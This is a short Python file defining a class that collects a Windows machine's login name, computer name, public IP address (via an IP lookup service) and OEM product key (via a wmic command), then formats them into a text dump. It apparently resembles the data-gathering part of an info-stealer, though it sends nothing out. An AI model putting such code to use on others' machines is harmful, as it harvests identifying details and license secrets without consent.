import os
import requests

class Windows(object):
	"""
	Gets windows information
	"""
	def __init__(self):
		self.user_data = ""
		self.dump_data = ""

	def get_data(self):
		user_data = {
			"USERNAME" : os.getlogin(),
			"COMPUTERNAME": os.getenv('COMPUTERNAME'),
			"IP": requests.get("https://api.ipify.org?format=json").json()["ip"],
			"WINDOWSKEY": os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()

		}
		self.user_data = user_data

	def dump(self):
		self.get_data()
		for data in self.user_data:
			self.dump_data += f"{data}: {self.user_data[data]}\n"
		return self.dump_data